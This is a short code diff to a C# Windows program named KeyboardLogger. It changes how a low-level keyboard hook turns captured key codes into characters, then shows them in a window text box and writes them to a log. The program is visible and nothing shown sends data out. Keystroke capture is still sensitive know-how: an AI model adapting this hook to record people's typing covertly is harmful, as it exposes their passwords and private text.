@@ -27,6 +27,7 @@ namespace KeyboardLogger
         public MainWin()
         {
             InitializeComponent();
+            KbdChar.Init();
         }
 
 
@@ -54,8 +55,10 @@ namespace KeyboardLogger
         {
             if (code >= 0)
             {
-                char key = (char)User32.MapVirtualKey(lParam.vkCode, MapVK.MAPVK_VK_TO_CHAR);
+                Keys key = (Keys)lParam.vkCode;
+                string keyStr = KbdChar.Char(lParam.vkCode, wParam == WM.KEYDOWN || wParam == WM.SYSKEYDOWN);
                 string txt = (wParam == WM.KEYUP || wParam == WM.SYSKEYUP)? key + "- " : key + " ";
+                txt = keyStr;
                 textBox_Log.Text = textBox_Log.Text + txt;
                 userLog.Write(txt);
             }
